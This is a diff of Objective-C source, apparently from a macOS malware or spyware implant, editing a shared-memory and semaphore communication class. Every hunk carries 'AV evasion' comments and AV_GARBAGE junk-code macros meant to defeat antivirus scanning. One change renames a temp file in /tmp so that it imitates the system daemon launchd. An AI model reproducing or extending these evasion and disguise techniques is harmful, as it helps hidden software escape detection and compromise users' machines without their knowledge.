@@ -219,7 +219,7 @@ static BOOL amIPrivileged()
       mSize          = aSize;
       mSemaphoreName = [aSemaphoreName copy];
 //      amISandboxed   = sandbox_compatibility(getpid(),0 ,0);
-      mAmIPrivUser   = amIPrivileged();
+      mBamIPrivUser   = amIPrivileged();
     }
   
   return self;
@@ -243,13 +243,13 @@ static BOOL amIPrivileged()
 
 - (void)removeMappedFile
 {
-  if (mAmIPrivUser)
+  if (mBamIPrivUser)
     return;
   
   // AV evasion: only on release build
   AV_GARBAGE_003
   
-  NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
+  NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchdch-%d", mKey];
   
   // AV evasion: only on release build
   AV_GARBAGE_007
@@ -314,7 +314,7 @@ static BOOL amIPrivileged()
   // if sanboxed do nothing...
 //  if (amISandboxed)
 //    return 0;
-  if (mAmIPrivUser)
+  if (mBamIPrivUser)
   {  
     // AV evasion: only on release build
     AV_GARBAGE_001
@@ -369,7 +369,7 @@ static BOOL amIPrivileged()
   // If sandboxed to nothing...
 //  if (amISandboxed == NO) 
 //  { 
-    if (mAmIPrivUser)
+    if (mBamIPrivUser)
     {  
       // AV evasion: only on release build
       AV_GARBAGE_002
@@ -436,7 +436,7 @@ static BOOL amIPrivileged()
       // AV evasion: only on release build
       AV_GARBAGE_001
       
-      if (mAmIPrivUser)
+      if (mBamIPrivUser)
         shmdt(mSharedMemory);
       
       return -1;
@@ -504,7 +504,7 @@ static BOOL amIPrivileged()
   // AV evasion: only on release build
   AV_GARBAGE_009
   
-  if (mAmIPrivUser)
+  if (mBamIPrivUser)
   {
     mSharedMemoryID = shmget(mKey, mSize, IPC_CREAT | GLOBAL_PERMISSIONS);
     
@@ -537,7 +537,7 @@ static BOOL amIPrivileged()
     AV_GARBAGE_002
     
     // create a tmp file for shmem
-    NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
+    NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchdch-%d", mKey];
     
     // AV evasion: only on release build
     AV_GARBAGE_007
@@ -631,13 +631,13 @@ static BOOL amIPrivileged()
 
 - (void)_unlockShmem
 {
-  if (mAmIPrivUser == NO)
+  if (mBamIPrivUser == NO)
     sem_post(mSemaphoreID);
 }
 
 - (void)_lockShmem
 {
-  if (mAmIPrivUser == NO)
+  if (mBamIPrivUser == NO)
     if (sem_wait(mSemaphoreID) != 0) 
       return;
 }
